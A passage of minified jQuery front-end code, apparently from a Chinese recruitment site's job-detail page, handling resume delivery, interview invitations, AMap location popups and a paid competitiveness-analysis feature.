        setTimeout(function() {
            $(".message").css("z-index", "101"),
            $(".aladingtip").fadeIn(),
            e.addClass("avatar-ani"),
            e.mouseover(function() {
                $(this).removeClass("avatar-ani")
            }),
            e.mouseout(function() {
                $(this).addClass("avatar-ani")
            })
        }, 3400),
        $(".aladingtip").click(function() {
            $(this).fadeOut(function() {
                e.removeClass("avatar-ani"),
                e.unbind("mouseover mouseout")
            })
        }))
    },
    showGuide: function() {
        var e = $(".container-tip")
          , t = $(".container-mes")
          , i = this;
        t.find(".message").css({
            top: "20px",
            "-webkit-transition": "all linear .2s",
            transition: "all linear .2s"
        }).fadeOut(),
        t.find(".avatar").fadeOut(),
        $(".aladingtip").fadeOut(),
        e.fadeIn(200),
        e.find(".tip-box").css({
            "margin-bottom": "35px",
            "-webkit-transition": "all linear .2s",
            transition: "all linear .2s"
        }),
        e.find(".trangle").css({
            bottom: "69px",
            "-webkit-transition": "all linear .2s",
            transition: "all linear .2s"
        }),
        e.find("a.close").click(function() {
            e.find(".tip-box").css({
                "margin-bottom": "15px",
                "-webkit-transition": "all linear .2s",
                transition: "all linear .2s"
            }),
            e.find(".trangle").css({
                bottom: "49px",
                "-webkit-transition": "all linear .2s",
                transition: "all linear .2s"
            }),
            $(".message").css("top", "160px"),
            e.fadeOut(function() {
                i.showMes()
            }),
            $(".jconfirm").length && $(".jconfirm").remove()
        })
    },
    getQueryParams: function(e) {
        for (var t = {}, i = (1 < e.split("?").length ? e.split("?")[1] : e).split("&"), n = 0; n < i.length; n++) {
            var a = i[n].split("=");
            1 < a.length && (t[a[0]] = a[1])
        }
        return t
    },
    getQueryString: function(e, t) {
        e = new RegExp("(^|&)" + e + "=([^&]*)(&|$)","i"),
        t = t.split("?")[1].match(e);
        return null != t ? decodeURIComponent(t[2]) : null
    },
    getIntersetStatus: function(t) {
        var e = Detail.getQueryString("jobId", t.attr("data-url"))
          , i = Detail.getQueryString("securityId", t.attr("data-url"))
          , n = $.Deferred();
        return $.ajax({
            type: "POST",
            url: "/wapi/zpgeek/resume/onekeydeliver/precheck.json",
            data: {
                jobId: e,
                securityId: i
            },
            dataType: "json",
            success: function(e) {
                0 == e.code ? e.zpData && e.zpData.result ? Detail.setInterest(t) : n.resolve(e) : 7 == e.code || 1011 == e.code ? ShowLoginDialog.showBossLogin({
                    params: {
                        pk: t.attr("ka") || ""
                    }
                }) : ($.toast({
                    content: e.message,
                    type: "error"
                }),
                25 === e.code && setTimeout(function() {
                    window.location.href = "/web/geek/guide"
                }, 1e3))
            },
            error: function(e) {
                $.toast({
                    content: e.resmsg,
                    type: "error"
                })
            }
        }),
        n
    },
    interestGeekDel: function(t, e) {
        var i = Detail.getQueryString("jobId", t.attr("data-url"));
        $.ajax({
            type: "POST",
            url: "/wapi/zpitem/web/geekInfoRight/feedback.json",
            data: {
                encryptJobId: i,
                encryptUsedId: e.usedId,
                flag: 1
            },
            dataType: "json",
            success: function(e) {
                0 == e.code ? ($.toast({
                    content: "感兴趣成功",
                    type: "success"
                }),
                Detail.setInterest(t)) : $.toast({
                    content: e.message,
                    type: "error"
                })
            },
            error: function() {
                $.toast({
                    content: "道具使用失败，请稍后再试！",
                    type: "error"
                })
            }
        })
    },
    interestGeekBomb: function(t) {
        var i = $.Deferred()
          , e = Detail.getQueryString("jobId", t.attr("data-url"));
        return $.ajax({
            type: "POST",
            url: "/wapi/zpitem/web/geekBomb/interest",
            data: {
                encryptJobId: e
            },
            dataType: "json",
            success: function(e) {
                0 == e.code && e.zpData.interestResult ? (Detail.setInterest(t),
                i.resolve(e)) : i.reject(e.message)
            },
            error: function() {
                i.reject("道具使用失败，请稍后再试！")
            }
        }),
        i
    },
    interestGeekOther: function(i, e) {
        var n = {
            securityId: Detail.getQueryString("securityId", i.attr("data-url")),
            oneKeyType: e.oneKeyType || "4"
        };
        Attachment.getAttachmentList(function(e) {
            var t = {};
            0 == e.code && e.zpData ? t = e.zpData : 7 != e.code && 1011 != e.code || ShowLoginDialog.showBossLogin({
                params: {
                    pk: i.attr("ka") || ""
                }
            }),
            1 < t.resumeCount ? (Attachment.showResumeSelecter(t, {
                callbackConfirm: function(e) {
                    $.extend(n, {
                        resumeId: e
                    }),
                    Detail.postDeliveResume(i.closest(".btns").find(".btn-sendresume"), n)
                }
            }),
            Detail.setInterest(i)) : 0 == t.resumeCount ? Attachment.showUploadWarning({
                title: "您还没有上传附件简历",
                confirmText: "立即上传",
                cancelText: "取消",
                callbackUpload: function() {
                    i.click()
                }
            }) : 1 == t.resumeCount && ($.extend(n, {
                resumeId: t.resumeList[0].resumeId
            }),
            Detail.postDeliveResume(i.closest(".btns").find(".btn-sendresume"), n),
            Detail.setInterest(i))
        })
    },
    dialogInterest: function(s) {
        Detail.getIntersetStatus(s).then(function(e) {
            var t = e.zpData.bizData
              , i = e.zpData
              , n = "感兴趣"
              , a = (3 === i.bizCode && (n = "要, 发简历"),
            "")
              , o = (a = (a = a + '<i class="arrow-noumenon"></i>' + ("<p>" + i.bizMessage || e.message + "</p>")) + '<div class="btn-wrap">' + "</div>",
            $.dialog({
                content: a,
                title: "",
                closeText: !1,
                confirmText: n,
                cancelText: "不, 只感兴趣",
                element: s,
                inline: !0,
                opacityLock: !0,
                wrapClass: "dialog-interes",
                onOpen: function(e) {},
                onConfirm: function(e) {
                    1 == i.bizCode ? Detail.interestGeekDel(s, t) : 2 == i.bizCode ? Detail.interestGeekBomb(s).then(function(e) {
                        Detail.startChat(s.parents(".op-links").siblings(".btn-startchat"))
                    }).fail(function(e) {
                        $.toast({
                            content: e,
                            type: "error"
                        })
                    }) : Detail.interestGeekOther(s, t),
                    e.remove()
                },
                onCancel: function(e) {
                    Detail.setInterest(s),
                    o.close()
                }
            }))
        })
    },
    uploadResume: function(t) {
        var i = $.dialog({
            content: '<p>上传附件简历，让BOSS更快更全面的了解你<br>支持DOC，DOCX，PDF，JPG，PNG格式附件，文件大小不超过8M</p><input id="fileupload"  type="file" name="file" ka="user-resume-upload-file">',
            title: "您还没有上传附件简历",
            closeText: !1,
            confirmText: "确定",
            cancelText: "取消",
            wrapClass: "dialog-uploadResume",
            onOpen: function(e) {},
            onConfirm: function(e) {
                Resume.beforeResumeUpload(function() {
                    $("#fileupload").click(),
                    Resume.fileUpload(t, function() {
                        i.close()
                    })
                })
            }
        })
    },
    setInterest: function(t, e) {
        var i = (e = e || {}).successCallbackFn
          , n = t.attr("job-id") ? {
            normal: "popjob_interest_" + t.attr("job_id"),
            active: "popjob_notinterest_" + t.attr("job_id")
        } : {
            normal: "job_detail_like",
            active: "job_detail_unlike"
        }
          , e = (e.eventArgs && (n = e.eventArgs),
        t.attr("data-url"))
          , a = null;
        t.hasClass("disabled") || (a = "感兴趣" == t.text() ? 1 : 0,
        t.addClass("disabled"),
        $.ajax({
            type: "POST",
            url: e,
            data: {
                flag: a
            },
            dataType: "json",
            success: function(e) {
                0 == e.code ? ("function" == typeof i && i({
                    flag: 1 == a ? 0 : 1
                }),
                1 == a ? (t.attr("ka", n.active),
                t.text("取消感兴趣").addClass("active")) : (t.attr("ka", n.normal),
                t.text("感兴趣").removeClass("active"))) : 1011 == e.code || 7 == e.code ? ($(".jconfirm").length && $(".jconfirm").remove(),
                ShowLoginDialog.showBossLogin({
                    params: {
                        pk: t.attr("ka") || ""
                    }
                })) : $.toast({
                    content: e.message,
                    type: "error"
                }),
                t.removeClass("disabled")
            },
            error: function(e) {
                t.removeClass("disabled"),
                603 !== e.status && $.toast({
                    content: "网络或服务故障，请稍后再试",
                    type: "error"
                })
            }
        }))
    },
    showInviteTip: function(t, i, n) {
        $.dialog({
            content: '<div class="text">· 面试前一天18点前，双方都可以申请取消。<br>· 如不取消，请按时出席面试，不要爽约。<br>· 对方爽约，约定时间30分钟可以投诉。<br>· 爽约一方，平台回加【不良记录】并公示。<br>· 为了方便联系，邀请面试成功后，双方自动交换手机联系方式。<br>· 对方将自动获取你的简历附件。</div>',
            title: "约面试诚信守则",
            closeText: !1,
            cancelText: "我再想想",
            confirmText: "保证不爽约",
            wrapClass: "interview-pop",
            onOpen: function(e) {},
            onConfirm: function(e) {
                Detail.beforeAcceptInvite(t, i, n),
                e.remove()
            }
        })
    },
    acceptInvite: function(t, e, i) {
        e = t.attr("data-url") + "&resumeId=" + (e || "");
        $.ajax({
            type: "POST",
            url: e,
            data: null,
            dataType: "json",
            success: function(e) {
                0 == e.code ? ($.toast({
                    content: "已接受邀请",
                    type: "success"
                }),
                setTimeout(function() {
                    window.location.reload()
                }, 1500)) : 1011 == e.code || 7 == e.code ? ShowLoginDialog.showBossLogin({
                    params: {
                        pk: t.attr("ka") || ""
                    }
                }) : 0 == e.rescode ? (alert(e.message),
                location.reload()) : ($.toast({
                    content: e.message,
                    type: "error"
                }),
                setTimeout(function() {
                    window.location.reload()
                }, 1500))
            },
            error: function() {
                $.toast({
                    content: "网络或服务故障，请稍后再试",
                    type: "error"
                })
            }
        })
    },
    refuseInvite: function(t) {
        var e = t.attr("data-url");
        t.hasClass("disabled") || (t.addClass("disabled"),
        $.ajax({
            type: "POST",
            url: e,
            data: null,
            dataType: "json",
            success: function(e) {
                0 == e.code ? $.dialog({
                    content: '<div class="text">已拒绝面试邀请</div>',
                    title: "",
                    closeText: !1,
                    cancelText: "",
                    confirmText: "确定",
                    wrapClass: "refuse-pop",
                    onOpen: function(e) {},
                    onConfirm: function(e) {
                        e.remove(),
                        setTimeout(function() {
                            window.location.reload()
                        }, 1500)
                    },
                    onClose: function() {
                        setTimeout(function() {
                            window.location.reload()
                        }, 1500)
                    }
                }) : 1011 == e.code || 7 == e.code ? ShowLoginDialog.showBossLogin({
                    params: {
                        pk: t.attr("ka") || ""
                    }
                }) : ($.toast({
                    content: e.resmsg,
                    type: "error"
                }),
                setTimeout(function() {
                    window.location.reload()
                }, 1500)),
                t.removeClass("disabled")
            },
            error: function() {
                $.toast({
                    content: "网络或服务故障，请稍后再试",
                    type: "error"
                }),
                t.removeClass("disabled")
            }
        }))
    },
    companyDetail: function() {
        var i, e;
        Detail.companyDetailLoaded || (Detail.companyDetailLoaded = !0,
        $(".job-location .job-location-map[data-content]").each(function() {
            var i = $(this)
              , e = i.attr("data-content") || "";
            if (!i.find("img").length)
                if (i.attr("data-src")) {
                    i.html('<img src="' + i.attr("data-src") + '" alt="公司地址"><p>点击查看地图</p>');
                    try {
                        _T.sendEvent("get_amap_pc")
                    } catch (e) {}
                } else
                    seriesLoadScripts("https://webapi.amap.com/maps?v=2.0&key=bbe07e5beb2d72627d0836be0c458860&callback=GApiGeLoaded"),
                    window.GApiGeLoaded = function() {
                        AMap.plugin(["AMap.Geocoder"], function() {
                            (new AMap.Geocoder).getLocation(e, function(e, t) {
                                if ("complete" === e && "OK" === t.info) {
                                    e = t.geocodes[0].location,
                                    t = -1 < window.location.host.indexOf("weizhipin.com") ? "https://amap-proxy.weizhipin.com" : "https://amap-proxy.zpurl.cn";
                                    i.html('<img src="' + t + "/v3/staticmap?zoom=16&amp;size=836*174&amp;markers=mid,0xFF0000,A:" + e.lng + "," + e.lat + '&amp;key=4ce180338a883b524313ffc22dfea73d" alt="公司地址"><p>点击查看地图</p>');
                                    try {
                                        _T.sendEvent("get_amap_self_pc")
                                    } catch (e) {}
                                }
                            })
                        })
                    }
        }),
        0 != (i = $(".job-location .map-container").eq(0)).length && $(".job-location .location-item").eq(0).hasClass("show-map") && (e = i.attr("data-content") || "",
        i.find("img").length || (seriesLoadScripts("https://webapi.amap.com/maps?v=2.0&key=bbe07e5beb2d72627d0836be0c458860&callback=GApiGeLoaded"),
        window.GApiGeLoaded = function() {
            if (i.attr("data-src")) {
                i.html('<img src="' + i.attr("data-src") + '" alt="公司地址"><p>点击查看地图</p>');
                try {
                    _T.sendEvent("get_amap_arr_pc")
                } catch (e) {}
            } else
                AMap.plugin(["AMap.Geocoder"], function() {
                    (new AMap.Geocoder).getLocation(e, function(e, t) {
                        if ("complete" === e && "OK" === t.info) {
                            e = t.geocodes[0].location,
                            t = -1 < window.location.host.indexOf("weizhipin.com") ? "https://amap-proxy.weizhipin.com" : "https://amap-proxy.zpurl.cn";
                            i.html('<img src="' + t + "/v3/staticmap?zoom=16&amp;size=836*174&amp;markers=mid,0xFF0000,A:" + e.lng + "," + e.lat + '&amp;key=4ce180338a883b524313ffc22dfea73d" alt="公司地址"><p>点击查看地图</p>');
                            try {
                                _T.sendEvent("get_amap_arr_self_pc")
                            } catch (e) {}
                        }
                    })
                })
        }
        )))
    },
    jobDetailMap: function() {
        $(".js-open-map, .job-address-box .all-address-btn").off("click").on("click", function(e) {
            e.preventDefault();
            var _ = $(this).hasClass("all-address-btn");
            if (_)
                try {
                    var t = window._jobInfo || {};
                    _T.sendEvent("userinfo-job-detail-clickmeltiadd", t.user_id, t.job_id, "", "")
                } catch (e) {}
            var e = $(".js-open-map")
              , t = e.data("gray")
              , i = e.find("img").attr("src").match(/:([^&]+)/g)
              , S = 1 == t ? e.data("lat") : i[1].replace(":", "")
              , D = _ ? "全城在招地址" : filterXss(e.attr("data-content"))
              , t = ['<div class="job-location show-map job-location-width">', '<div class="location-address">' + D + "</div>", '<div class="input-address">', '<input class="current-address" value="" placeholder="搜索工作地址" /><i class="address-icon address-icon-search"></i>', '<div class="address-info"></div>', '<ul class="address-list"></ul>', "</div>", '<div id="map-container" class="map-container" data-long-lat="' + S + '"><div class="tip-inner"><p class="gray"><i class="ui-icon-loading"></i>正在加载中...</p></div></div>', "</div>"];
            $.dialog({
                content: t.join(""),
                title: "",
                closeText: !0,
                cancelText: "",
                confirmText: "",
                wrapClass: "map-pop",
                closeLayer: !1,
                onOpen: function(T) {
                    seriesLoadScripts("https://webapi.amap.com/maps?v=2.0&key=bbe07e5beb2d72627d0836be0c458860&callback=GApiLoaded"),
                    window.GApiLoaded = function() {
                        T.find(".tip-inner").remove();
                        var i, n, a, t = S.split(","), r = new AMap.Map("map-container",{
                            resizeEnable: !0,
                            scrollWheel: !0,
                            center: [t[0], t[1]],
                            zoom: _ ? 10 : 16
                        }), c = new AMap.InfoWindow({
                            content: D,
                            offset: new AMap.Pixel(14,0)
                        }), o = [], l = [], s = [], d = [], p = [], u = _ ? "area" : "business", h = {}, f = {
                            area: {
                                minZoom: 2,
                                maxZoom: 12
                            },
                            business: {
                                minZoom: 12,
                                maxZoom: 22
                            }
                        }, m = "";
                        function g() {
                            var e = new AMap.Marker({
                                map: r,
                                anchor: "bottom-center",
                                position: [t[0], t[1]],
                                icon: new AMap.Icon({
                                    size: new AMap.Size(26,31),
                                    image: "https://res.zhipin.com/web/geek/resource/marker-icon-red.png"
                                })
                            });
                            e.on("click", function() {
                                c.open(r, e.getPosition())
                            }),
                            c.open(r, r.getCenter())
                        }
                        function v() {
                            switch (u = p.length ? u : "business") {
                            case "area":
                                var e;
                                c.close(),
                                w(!1),
                                s = [],
                                $.each(p, function(e, t) {
                                    var i = !1
                                      , n = ($.each(t.clusterData, function(e, t) {
                                        t.jobAddressId == h.jobAddressId && (i = !0)
                                    }),
                                    new AMap.Marker({
                                        map: r,
                                        anchor: "bottom-center",
                                        position: [t.midlong, t.midlat],
                                        content: '<div class="area-marker ' + (i ? " active" : "") + '"><span>' + t.typeName + "</span><span>" + t.clusterData.length + "</span></div>",
                                        extData: {
                                            area: t
                                        }
                                    }));
                                    i && (n.setTop(!0),
                                    r.setCenter([t.midlong - .05, t.midlat - .01])),
                                    t.marker = n,
                                    s.push(n),
                                    n.off("click"),
                                    n.on("click", function() {
                                        var e = i ? h : t.clusterData[0];
                                        r.setZoomAndCenter(12, [e.longitude - .05, e.latitude - .01])
                                    })
                                }),
                                h.jobAddressId || (s[0].setTop(!0),
                                e = s[0].getPosition(),
                                r.setZoomAndCenter(10, [e.lng - .05, e.lat - .01]));
                                break;
                            case "business":
                                $.each(s, function(e, t) {
                                    t.hide()
                                }),
                                w(!0)
                            }
                        }
                        function w(i) {
                            $.each(l, function(e, t) {
                                i ? t.show() : t.hide()
                            })
                        }
                        function b() {
                            r.on("zoomend", function() {
                                var e = function(e) {
                                    for (var t in f) {
                                        var i = f[t] || {};
                                        if (e >= i.minZoom && e < i.maxZoom)
                                            return t
                                    }
                                    return null
                                }(r.getZoom());
                                e != u && (u = e,
                                v())
                            })
                        }
                        function y(e, t) {
                            m = (h = e).addressTitle || "";
                            var i = window._jobInfo || {}
                              , n = "/wapi/zpgeek/friend/add.json?securityId=" + e.securityId + "&jobId=" + i.job_id + "&jobAddressId=" + e.jobAddressId
                              , a = "/web/geek/chat?id=" + i.user_id
                              , i = ['<div class="address-selected-info"><h2>' + e.addressTitle + "</h2><span>" + e.locationDesc + "</span></div>", '<div class="address-job-info"><h2>' + i.job_name + "</h2><span>" + i.job_salary + "</span></div>", '<a class="btn btn-startchat" data-isfriend="true" data-url="' + n + '" redirect-url="' + a + '" href="javascript:;">立即沟通</a></div>']
                              , o = (T.find(".current-address").val(e.addressTitle),
                            T.find(".address-list").hide(),
                            T.find(".address-info").html(i.join("")).show(),
                            T.find(".address-icon").removeClass("address-icon-search").addClass("address-icon-close"),
                            T.find(".location-address").text(e.addressTitle || ""),
                            e.marker)
                              , n = t
                              , a = ($.each(l, function(e, t) {
                                t.setIcon(new AMap.Icon({
                                    size: new AMap.Size(26,31),
                                    image: "https://res.zhipin.com/web/geek/resource/marker-icon-green.png"
                                }))
                            }),
                            o.getExtData().addressInfo)
                              , s = (n && r.setZoomAndCenter(12, [a.longitude - .05, a.latitude - .01]),
                            o.setTop(!0),
                            setTimeout(function() {
                                o.setIcon(new AMap.Icon({
                                    size: new AMap.Size(26,31),
                                    image: "https://res.zhipin.com/web/geek/resource/marker-icon-red.png"
                                })),
                                clearTimeout(s)
                            }, 10));
                            c.setContent(a.addressTitle || ""),
                            c.open(r, o.getPosition())
                        }
                        function x(e, t) {
                            if ((t || []).length) {
                                for (var i = "", n = 0; n < t.length; n++)
                                    i += '<li data-aid="' + t[n].jobAddressId + '">',
                                    t[n].hlname ? i += t[n].hlname : i += "<h2>" + t[n].addressTitle + "</h2>",
                                    i += "<span>" + t[n].locationDesc + "</span></li>";
                                e.find(".address-list").html(i).show()
                            } else
                                e.find(".address-list").hide()
                        }
                        function k() {
                            for (var e = 0; e < o.length; e++) {
                                var t = new AMap.Marker({
                                    map: r,
                                    anchor: "bottom-center",
                                    icon: new AMap.Icon({
                                        size: new AMap.Size(26,31),
                                        image: "https://res.zhipin.com/web/geek/resource/marker-icon-green.png"
                                    }),
                                    position: [o[e].longitude, o[e].latitude],
                                    extData: {
                                        addressInfo: o[e]
                                    }
                                });
                                l.push(t),
                                (o[e].marker = t).off("click"),
                                t.on("click", function(e) {
                                    y(C(e.target.getExtData().addressInfo.jobAddressId))
                                })
                            }
                            p.length && _ || (y(o[0], !0),
                            u = "business"),
                            v(),
                            b()
                        }
                        function C(e) {
                            for (var t = 0; t < o.length; t++)
                                if (e == o[t].jobAddressId)
                                    return o[t]
                        }
                        r.plugin(["AMap.ToolBar", "AMap.Scale"], function() {
                            var e = new AMap.ToolBar({
                                position: "RT"
                            })
                              , t = new AMap.Scale;
                            r.addControl(e),
                            r.addControl(t)
                        }),
                        T.find(".address-info").off("click", ".btn-startchat").on("click", ".btn-startchat", function() {
                            Detail.startChat($(this))
                        }),
                        T.find(".address-list").on("click", "li", function() {
                            var e = C($(this).data("aid"));
                            e && y(e, !0)
                        }),
                        T.find(".address-icon").off("click").on("click", function() {
                            $(this).hasClass("address-icon-close") && (T.find(".current-address").val(""),
                            T.find(".address-info").hide(),
                            T.find(".address-icon").removeClass("address-icon-close").addClass("address-icon-search"),
                            x(T, o))
                        }),
                        T.find(".input-address .current-address").off("blur").on("blur", function() {
                            var e;
                            m && T.find(".address-icon").removeClass("address-icon-search").addClass("address-icon-close"),
                            $(this).val() || (e = setTimeout(function() {
                                T.find(".address-list").hide(),
                                h.jobAddressId && T.find(".address-info").show(),
                                m && T.find(".current-address").val(m),
                                clearTimeout(e)
                            }, 200))
                        }),
                        T.find(".current-address").on("focus", function() {
                            if (!$(this).val()) {
                                T.find(".address-info").hide();
                                for (var e = [], t = 0; t < o.length; t++)
                                    e.push({
                                        securityId: o[t].securityId,
                                        jobAddressId: o[t].jobAddressId,
                                        addressTitle: o[t].addressTitle,
                                        locationDesc: o[t].locationDesc,
                                        latitude: o[t].latitude,
                                        longitude: o[t].longitude
                                    });
                                x(T, e)
                            }
                        }),
                        T.find(".current-address").on("input", (i = 300,
                        n = function() {
                            T.find(".address-info").hide(),
                            T.find(".address-icon").removeClass("address-icon-close").addClass("address-icon-search");
                            for (var e = $(this).val() || "", t = [], i = 0; i < o.length; i++) {
                                var n = (o[i].addressTitle || "").indexOf(e);
                                -1 < n && t.push({
                                    securityId: o[i].securityId,
                                    jobAddressId: o[i].jobAddressId,
                                    addressTitle: o[i].addressTitle,
                                    locationDesc: o[i].locationDesc,
                                    latitude: o[i].latitude,
                                    longitude: o[i].longitude,
                                    hlname: "<h2>" + (o[i].addressTitle || "").slice(0, n) + "<em>" + e + "</em>" + (o[i].addressTitle || "").slice(n + e.length) + "</h2>"
                                })
                            }
                            x(T, t)
                        }
                        ,
                        function() {
                            var e = this
                              , t = arguments;
                            clearTimeout(a),
                            a = setTimeout(function() {
                                n.apply(e, t)
                            }, i)
                        }
                        )),
                        $(".job-address-box .all-address-btn").length ? $.ajax({
                            url: "/wapi/zpgeek/job/multiaddress/query.json",
                            method: "get",
                            data: {
                                securityId: (window._jobInfo || {}).securityId
                            },
                            success: function(e) {
                                var t;
                                0 == e.code && e.zpData && ((o = e.zpData.jobAddressList || []).length ? ($.each(o, function(e) {
                                    var t = e.province == e.city ? e.city : e.province + e.city;
                                    e.addressText = t + (e.area || "") + e.addressText
                                }),
                                T.find(".input-address").show(),
                                e = o[0],
                                t = function() {
                                    var e = $.map(d, function(i) {
                                        var n = [];
                                        return $.each(o, function(e, t) {
                                            t.areaCode == i.typeCode && n.push(t)
                                        }),
                                        i.clusterData = n,
                                        i
                                    })
                                      , i = [];
                                    $.each(e, function(e, t) {
                                        t.clusterData.length && i.push(t)
                                    }),
                                    p = i,
                                    k()
                                }
                                ,
                                $.ajax({
                                    url: "/wapi/zpCommon/data/listForCityAreaGps",
                                    method: "get",
                                    data: {
                                        cityCode: e.cityCode
                                    },
                                    success: function(e) {
                                        0 == e.code && e.zpData && (d = e.zpData.gpsList || [],
                                        t())
                                    },
                                    error: function() {
                                        t()
                                    }
                                })) : g())
                            },
                            error: function(e) {
                                g()
                            }
                        }) : g()
                    }
                }
            });
            try {
                var n = (window._jobInfo || {}).job_id || "";
                _T.sendEvent("address-map-click", "1", n)
            } catch (e) {}
        })
    },
    detailMap: function() {
        $(".js-open-detail").on("click", function(e) {
            e.stopPropagation();
            var e = $(this).attr("data-id")
              , t = $(this).attr("data-lat")
              , a = filterXss($(this).attr("data-content"))
              , e = ['<div class="location-item show-map location-item-pop">', '<div class="location-address"><a href="javascript:;" class="more-view><i class="fz fz-slidedown"></i></a>' + a + "</div>", '<div class="map-container js-map-container" id="' + e + '" data-long-lat="' + t + '"><div class="tip-inner"><p class="gray"><i class="ui-icon-loading"></i>正在加载中...</p></div>', "</div>"];
            $.dialog({
                content: e.join(""),
                title: "",
                closeText: !0,
                cancelText: "",
                confirmText: "",
                wrapClass: "map-pop",
                onOpen: function(e) {
                    seriesLoadScripts("https://webapi.amap.com/maps?v=2.0&key=bbe07e5beb2d72627d0836be0c458860&callback=GApiLoaded"),
                    window.GApiLoaded = function() {
                        e.find(".tip-inner").remove(),
                        $(".js-map-container").each(function() {
                            var e = $(this).attr("id")
                              , t = $(this).attr("data-long-lat").split(",")
                              , i = new AMap.Map(e,{
                                resizeEnable: !0,
                                scrollWheel: !0,
                                center: [t[0], t[1]],
                                zoom: 16
                            })
                              , n = new AMap.Marker({
                                map: i,
                                anchor: "bottom-center",
                                position: [t[0], t[1]],
                                icon: new AMap.Icon({
                                    size: new AMap.Size(26,31),
                                    image: "https://res.zhipin.com/web/geek/resource/marker-icon-red.png"
                                })
                            });
                            n.on("click", function() {
                                infoWindow.open(i, n.getPosition())
                            }),
                            (infoWindow = new AMap.InfoWindow({
                                content: a,
                                offset: new AMap.Pixel(14,0)
                            })).open(i, i.getCenter()),
                            i.plugin(["AMap.ToolBar", "AMap.Scale"], function() {
                                var e = new AMap.ToolBar
                                  , t = new AMap.Scale;
                                i.addControl(e),
                                i.addControl(t)
                            })
                        })
                    }
                }
            });
            try {
                var i = (window._brandInfo || {}).brand_id || "";
                _T.sendEvent("address-map-click", "2", i)
            } catch (e) {}
        })
    },
    mapCommuting: function() {
        $(".company-body-wrapper .js-open-detail, .job-body-wrapper .js-open-map").off("click").on("click", function(e) {
            e.stopPropagation();
            var t, e = $(this).attr("data-addressid"), i = (window._brandInfo || {}).brand_id || "", n = "/web/geek/map/path?addressId=" + e + "&brandId=" + i, e = ['<iframe frameborder="0" src="' + (n = $(this).hasClass("js-open-map") ? "/web/geek/map/path?addressId=" + e + "&securityId=" + ((window._jobInfo || {}).securityId || "") : n) + '"></iframe>', '<div class="boss-loading"><span class="component-b"></span><span class="component-o"></span><span class="component-s1"></span><span class="component-s2"></span></div>'];
            $.dialog({
                content: e.join(""),
                title: "",
                cancelText: "",
                confirmText: "",
                wrapClass: "dialog-map-commuting",
                onOpen: function(e) {
                    var t = e.find(".boss-loading")
                      , i = e.find("iframe");
                    $(window).on("message.mapPath", function(e) {
                        e = e.originalEvent.data;
                        try {
                            "map-load" == JSON.parse(e).type && (i.show(),
                            t.remove())
                        } catch (e) {}
                    })
                },
                onClose: function() {
                    $(window).off("message.mapPath")
                }
            });
            try {
                $(this.hasClass("job-open-map")) ? (t = (window._jobInfo || {}).job_id || "",
                _T.sendEvent("address-map-click", "1", t)) : (i = (window._brandInfo || {}).brand_id || "",
                _T.sendEvent("address-map-click", "2", i))
            } catch (e) {}
        })
    },
    showPropDetail: function() {
        var t, n, i = $(".prop-item"), a = i.find(".prop-container"), o = i.find(".prop-detail");
        "undefined" != typeof _jobInfo && ($.get("/wapi/zpitem/web/competitive/jobDetail.json", {
            encryptJobId: _jobInfo.job_id
        }, function(e) {
            0 == e.code ? (i.find(".prop-default").removeClass("prop-default"),
            i.find("h3").append("<span>已开启</span>"),
            a.find(".level-" + (e.zpData.position + 1)).prepend('<p class="text-position icon-position">您的位置</p>'),
            o.find(".pull-right").siblings().html("个人综合排名：<span>三个月内共<em>" + e.zpData.totalNum + "</em>位牛人沟通</span>"),
            o.find(".pull-right").html('<a href="javascript:;" class="link-detail" ka="check_personal_competitive_detail">查看完整个人竞争力</a>')) : 600054 == e.code ? i.remove() : (i.find(".prop-default").removeClass("prop-default"),
            a.prepend('<p class="text-position">你在？位置</p>'),
            o.find(".pull-right").html('<a href="javascript:;" class="link-detail" ka="check_personal_competitive_detail">查看完整个人竞争力</a>'))
        }),
        t = function() {
            var t = $.Deferred();
            return $.get("/wapi/zpitem/web/competitive/useStatus.json", {
                encryptJobId: _jobInfo.job_id
            }, function(e) {
                e.zpData && e.zpData.jumpUrl && (e.zpData.jumpUrl = "/web/geek/competitive-detail?encryptJobId=" + _jobInfo.job_id),
                t.resolve(e)
            }),
            t
        }
        ,
        n = function(e, t) {
            var i = "/web/geek/competitive-detail?encryptJobId=" + e.targetId;
            $.ajax({
                url: "/wapi/zpitem/web/competitive/use",
                data: {
                    encryptJobId: e.targetId
                },
                type: "post",
                success: function(e) {
                    0 == e.code ? window.location.href = i : 600050 == e.code ? Detail.showPop({
                        title: "温馨提示",
                        content: "您的道具次数已用完<br />请先购买竞争力分析器，助你提高求职胜算",
                        confirmText: "去购买",
                        callback: function(e) {
                            e.find(".btn-sure").on("click", function() {
                                try {
                                    _T.sendEvent("to_buy_warm_tips")
                                } catch (e) {}
                                e.remove(),
                                ItemShop.analyzer(function() {
                                    $.toast({
                                        type: "success",
                                        content: "购买成功"
                                    })
                                })
                            })
                        }
                    }) : 600051 == e.code ? Detail.showPop({
                        title: "温馨提示",
                        content: "您的简历未完善，无法使用竞争力分析器<br />完善简历后，道具使用效果会更好哦",
                        confirmText: "立即完善",
                        callback: function(e) {
                            e.find(".btn-sure").on("click", function() {
                                try {
                                    _T.sendEvent("complete_immediately_resume_uncompleted")
                                } catch (e) {}
                                window.location.href = i
                            })
                        }
                    }) : 600052 == e.code ? Detail.showPop({
                        title: "温馨提示",
                        content: "该职位已停止招聘，暂时无法使用道具<br />去看看其他职位",
                        confirmText: "我知道啦",
                        callback: function(e) {
                            e.find(".btn-sure").on("click", function() {
                                e.remove();
                                try {
                                    _T.sendEvent("to_buy_warm_tips")
                                } catch (e) {}
                            })
                        }
                    }) : $.toast({
                        content: e.message,
                        type: "error"
                    })
                }
            })
        }
        ,
        o.on("click", ".link-detail", function() {
            try {
                Report.myActionLog({
                    action: "biz-item-geekcompetitive-click",
                    p1: "job-detail-bottom"
                })
            } catch (e) {}
            var e;
            e = $(this),
            t().then(function(i) {
                if (7 == i.code || 1011 == i.code)
                    ShowLoginDialog.showBossLogin({
                        params: {
                            pk: e.attr("ka") || ""
                        }
                    });
                else if (24 == i.code)
                    $.toast({
                        content: "您好，切换到牛人身份，即可查看个人竞争力分析",
                        type: "error"
                    });
                else if (1 == i.zpData.status) {
                    try {
                        _T.sendEvent("show_personal_competitive_detail")
                    } catch (e) {}
                    window.location.href = i.zpData.jumpUrl
                } else
                    0 != i.zpData.itemLeftCount ? $.dialog({
                        title: "",
                        content: "确定对该职位使用竞争力分析器？",
                        confirmText: "使用1/" + i.zpData.itemLeftCount,
                        cancelText: "我再想想",
                        wrapClass: "dialog-icons-default dialog-alert-default dialog-around-default dialog-opacity-layer",
                        position: "around",
                        opacityLock: !0,
                        element: o.find(".link-detail"),
                        inline: !0,
